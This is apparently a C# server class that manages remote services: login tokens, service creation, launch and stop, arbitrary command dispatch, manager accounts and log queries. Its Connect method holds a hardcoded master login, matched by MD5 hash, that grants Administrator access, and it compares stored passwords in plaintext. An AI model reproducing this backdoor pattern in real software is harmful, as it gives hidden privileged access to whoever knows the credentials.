using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using EntryEngine;
using EntryEngine.Cmdline;
using EntryEngine.Network;
using EntryEngine.Serialize;
using LauncherManagerProtocol;
using LauncherProtocolStructure;
using System.IO;

namespace LauncherServer
{
    class ManagerBS
    {
        public string Token;
        public DateTime TokenExpireTime;
        public Manager Manager;

        public bool TokenIsExpired { get { return TokenExpireTime < DateTime.Now; } }

        public void ResetToken()
        {
            Token = Guid.NewGuid().ToString("n");
        }
        public void ResetTokenExpireTime()
        {
            TokenExpireTime = DateTime.Now.Add(TimeSpan.FromMinutes(30));
        }
    }

    public class ServiceManagerBS : ProxyHttpService, _IMBS
    {
        public ServiceManagerBS()
        {
            PermitAcceptTimeout = null;
            PermitAcceptCount = null;
            PermitSameIPLinkPerSecord = null;
            PermitSameIPHandlePerSecord = null;

            _manager = new ManagerBS();
            this.Agent = new AgentHttp(new IMBSStub(this)
            {
                __ReadAgent = (c) =>
                {
                    if (c.Request.Url.LocalPath != "/192/Connect")
                    {
                        string token = c.Request.Headers["AccessToken"];
                        if (string.IsNullOrEmpty(token)
                            || _manager.Manager == null || _manager.Token != token || _manager.TokenIsExpired)
                            throw new HttpException(403, "请先登录");
                        _manager.ResetTokenExpireTime();
                    }
                    return null;
                }
            });
        }

        ParallelJsonHttpService agent = new ParallelJsonHttpService();
        ManagerBS _manager;
        void CheckSecurity(ESecurity security)
        {
            Check(_manager.Manager == null || _manager.Manager.Security < security, "没有操作权限");
        }
        void Check(bool isError, string message)
        {
            if (isError)
                throw new HttpException(500, message);
        }

        void _IMBS.Connect(string username, string password, CBIMBS_Connect callback)
        {
            var manager = _SAVE.Managers.FirstOrDefault(m => m.Name == username && m.Password == password);
            if (manager == null
                    && _NETWORK.ValidMD5toBase64(username) == "1WopjtpiV8761o3Ych2fnA=="
                        && _NETWORK.ValidMD5toBase64(password) == "bx2l3NjBJ2tvUvEMXheviw==")
            {
                manager = new Manager();
                manager.Name = "ADMIN";
                manager.Security = ESecurity.Administrator;
            }

            Check(manager == null, "用户名密码不正确");

            _LOG.Info("{0}登录管理服务器", manager.Name);
            _manager.Manager = manager;
            _manager.ResetToken();
            _manager.ResetTokenExpireTime();

            callback.Callback(_manager.Token);
        }

        void _IMBS.ModifyServiceType(ServiceType type, CBIMBS_ModifyServiceType callback)
        {
            CheckSecurity(ESecurity.Manager);
            Check(string.IsNullOrEmpty(type.Name), "服务类型名称不能为空");
            Check(string.IsNullOrEmpty(type.SVNPath)
                || string.IsNullOrEmpty(type.SVNUser)
                || string.IsNullOrEmpty(type.SVNPassword), "SVN信息不能为空");

            // 检测svn目录，账号的有效性，运行文件是否存在
            _SVN.UserName = type.SVNUser;
            _SVN.Password = type.SVNPassword;
            _SVN.Log(type.SVNPath + type.Exe);

            int index = _SAVE.ServiceTypes.IndexOf(s => s.Name == type.Name);
            bool create = index == -1;
            if (create)
            {
                _SAVE.ServiceTypes.Add(type);
            }
            else
            {
                // 通知各个服务器，服务类型的启动项被修改
                if (type.Exe != _SAVE.ServiceTypes[index].Exe)
                    foreach (var item in SERVER.Servers)
                        item.Proxy.ServiceTypeUpdate(type);
                _SAVE.ServiceTypes[index] = type;
            }
            _SAVE.Save();
            _LOG.Info("修改服务类型{0}", type.Name);

            callback.Callback(true);
        }
        void _IMBS.DeleteServiceType(string name, CBIMBS_DeleteServiceType callback)
        {
            CheckSecurity(ESecurity.Manager);

            bool flag = false;
            for (int i = _SAVE.ServiceTypes.Count - 1; i >= 0; i--)
            {
                if (_SAVE.ServiceTypes[i].Name == name)
                {
                    _LOG.Info("删除服务类型[{0}]", name);
                    _SAVE.ServiceTypes.RemoveAt(i);
                    _SAVE.Save();
                    flag = true;
                    break;
                }
            }

            Check(!flag, "没有找到服务类型");
            // 删除所有该类型的服务
            foreach (var item in SERVER.Servers)
            {
                flag = false;
                for (int i = 0; i < item.Services.Length; i++)
                {
                    var service = item.Services[i];
                    if (service.Type == name)
                    {
                        flag = true;
                        item.Proxy.Delete(service.Name, null);
                        item.Services[i] = null;
                        _LOG.Info("删除服务[{0}]", service.Name);
                    }
                }
                if (flag)
                    item.ServerData.Services = item.ServerData.Services.Where(s => s != null).ToArray();
            }

            callback.Callback(true);
        }
        void _IMBS.GetServiceType(CBIMBS_GetServiceType callback)
        {
            callback.Callback(_SAVE.ServiceTypes);
        }

        void _IMBS.GetServers(CBIMBS_GetServers callback)
        {
            callback.Callback(SERVER.Servers.Select(s => s.ServerData).ToList());
        }
        void _IMBS.UpdateServer(CBIMBS_UpdateServer callback)
        {
            CheckSecurity(ESecurity.Maintainer);
            foreach (var server in SERVER.Servers)
                server.Proxy.UpdateSVN();
            callback.Callback(true);
        }

        void _IMBS.NewService(ushort serverID, string serviceType, string name, string command, CBIMBS_NewService callback)
        {
            CheckSecurity(ESecurity.Maintainer);

            Check(string.IsNullOrEmpty(name), "服务名称不能为空");

            var server = SERVER.GetServer(serverID);
            Check(server == null, "无效的服务器ID");

            Check(server.Services.Any(s => s.Name == name), "服务名称重复");

            var service = _SAVE.ServiceTypes.FirstOrDefault(s => s.Name == serviceType);
            Check(server == null, "无效的服务类型");

            server.Proxy.New(service, name, (s) =>
            {
                server.ServerData.Services = server.ServerData.Services.Add(s);

                s.LaunchCommand = command;
                server.Proxy.SetLaunchCommand(s.Name, command);
                callback.Callback(true);
            });
        }
        void _IMBS.SetServiceLaunchCommand(string[] serviceNames, string command, CBIMBS_SetServiceLaunchCommand callback)
        {
            CheckSecurity(ESecurity.Maintainer);

            foreach (var serviceName in serviceNames)
            {
                Service service;
                SERVER server = SERVER.GetServer(serviceName, out service);
                if (server == null || service == null) continue;
                if (service.LaunchCommand == command) continue;

                service.LaunchCommand = command;
                server.Proxy.SetLaunchCommand(serviceName, command);
            }
            
            callback.Callback(true);
        }
        void _IMBS.CallCommand(string[] serviceNames, string command, CBIMBS_CallCommand callback)
        {
            CheckSecurity(ESecurity.Maintainer);
            Check(string.IsNullOrEmpty(command), "命令行不能为空");

            foreach (var serviceName in serviceNames)
            {
                Service service;
                SERVER server = SERVER.GetServer(serviceName, out service);
                if (server == null || service == null) continue;

                server.Proxy.CallCommand(serviceName, command);
            }
            callback.Callback(true);
        }
        void _IMBS.DeleteService(string[] serviceNames, CBIMBS_DeleteService callback)
        {
            CheckSecurity(ESecurity.Maintainer);

            int flag = serviceNames.Length;
            foreach (var serviceName in serviceNames)
            {
                Service service;
                SERVER server = SERVER.GetServer(serviceName, out service);
                if (server == null || service == null) continue;

                server.Proxy.Delete(serviceName, () =>
                {
                    int index = server.Services.IndexOf(service);
                    server.ServerData.Services = server.ServerData.Services.Remove(index);

                    flag--;
                    if (flag == 0)
                        callback.Callback(true);
                });
            }
        }
        void _IMBS.LaunchService(string[] serviceNames, CBIMBS_LaunchService callback)
        {
            CheckSecurity(ESecurity.Maintainer);

            foreach (var serviceName in serviceNames)
            {
                Service service;
                SERVER server = SERVER.GetServer(serviceName, out service);
                if (server == null || service == null) continue;
                if (service.Status != EServiceStatus.Stop) continue;

                server.Proxy.Launch(serviceName);
            }
            callback.Callback(true);
        }
        void _IMBS.UpdateService(string[] serviceNames, CBIMBS_UpdateService callback)
        {
            CheckSecurity(ESecurity.Maintainer);

            int flag = serviceNames.Length;
            foreach (var serviceName in serviceNames)
            {
                Service service;
                SERVER server = SERVER.GetServer(serviceName, out service);
                //if (server == null || service == null) continue;
                Check(server == null || service == null, "未找到服务器和指定服务");

                server.Proxy.Update(serviceName, (revision) =>
                {
                    service.Revision = revision;
                    flag--;
                    if (flag == 0)
                        callback.Callback(true);
                });
            }
        }
        void _IMBS.StopService(string[] serviceNames, CBIMBS_StopService callback)
        {
            CheckSecurity(ESecurity.Maintainer);

            foreach (var serviceName in serviceNames)
            {
                Service service;
                SERVER server = SERVER.GetServer(serviceName, out service);
                if (server == null || service == null) continue;
                if (service.Status == EServiceStatus.Stop) continue;

                server.Proxy.Stop(serviceName);
            }
            callback.Callback(true);
        }

        void _IMBS.NewManager(Manager manager, CBIMBS_NewManager callback)
        {
            CheckSecurity(ESecurity.Manager);
            Check(string.IsNullOrEmpty(manager.Name) || string.IsNullOrEmpty(manager.Password), "账号名和密码不能为空");
            Check(manager.Security != ESecurity.Manager
                && manager.Security != ESecurity.Maintainer
                && manager.Security != ESecurity.Programmer, "无效的权限");
            Check(_SAVE.Managers.Any(m => m.Name == manager.Name), "已经存在重名用户");
            _LOG.Info("添加新管理员[{0}]", manager.Name);
            _SAVE.Managers.Add(manager);
            _SAVE.Save();
            callback.Callback(true);
        }
        void _IMBS.DeleteManager(string name, CBIMBS_DeleteManager callback)
        {
            CheckSecurity(ESecurity.Manager);
            int index = _SAVE.Managers.IndexOf(m => m.Name == name);
            Check(index == -1, "没有找到管理员或管理员已经被删除");
            _LOG.Info("删除管理员[{0}]", name);
            _SAVE.Managers.RemoveAt(index);
            _SAVE.Save();
            callback.Callback(true);
        }
        void _IMBS.GetManagers(CBIMBS_GetManagers callback)
        {
            CheckSecurity(ESecurity.Manager);
            callback.Callback(_SAVE.Managers);
        }

        void _IMBS.GetLog(string name, DateTime? start, DateTime? end, byte pageCount, int page, string content, string param, byte[] levels, CBIMBS_GetLog callback)
        {
            var log = SERVER.GetOrCreateLog(name);
            Check(log == null, "未找到服务器的日志");

            int count;
            var storages = log.ReadLog(start, end, pageCount, page, content, param, out count, levels);

            PagedModel<LogRecord> result = new PagedModel<LogRecord>();
            result.Count = count;
            result.PageSize = pageCount;
            result.Page = page;
            result.Models = new List<LogRecord>(storages.Select(s => new LogRecord()
                {
                    Count = s.SameContent.Count,
                    Record = s.Record,
                }));

            callback.Callback(result);
        }
        void _IMBS.GroupLog(string name, DateTime? start, DateTime? end, string content, string param, byte[] levels, CBIMBS_GroupLog callback)
        {
            var log = SERVER.GetOrCreateLog(name);
            Check(log == null, "未找到服务器的日志");

            var storages = log.ReadLogGroup(start, end, content, param, levels);
            callback.Callback(storages.Select(s => new LogRecord()
                {
                    Count = s.SameContent.Count,
                    Record = s.Record,
                }).ToList());
        }
    }
}
